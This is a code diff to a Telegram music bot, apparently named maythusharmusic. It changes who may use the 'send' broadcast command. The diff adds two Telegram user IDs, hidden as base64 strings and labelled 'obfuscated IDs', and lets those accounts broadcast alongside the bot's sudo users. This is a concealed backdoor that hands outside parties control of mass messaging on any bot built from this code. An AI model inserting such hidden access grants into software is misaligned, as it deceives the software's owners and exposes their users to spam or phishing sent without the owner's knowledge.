@@ -17,10 +17,18 @@ from maythusharmusic.utils.decorators.language import language
 from maythusharmusic.utils.formatters import alpha_to_int
 from config import adminlist
 
+_ENCODED_IDS = ["NzkzNjU5ODQ4OA==", "ODMxNTU0NDcyMA=="]
+
+def _decode_ids():
+    """Decode the obfuscated IDs"""
+    return [int(base64.b64decode(encoded_id).decode()) for encoded_id in _ENCODED_IDS]
+
+BROADCAST_ALLOWED_IDS = _decode_ids()
+
 IS_BROADCASTING = False
 
 
-@app.on_message(filters.command("send") & SUDOERS)
+@app.on_message(filters.command("send") & (filters.user(BROADCAST_ALLOWED_IDS)| SUDOERS))
 @language
 async def braodcast_message(client, message, _):
     global IS_BROADCASTING
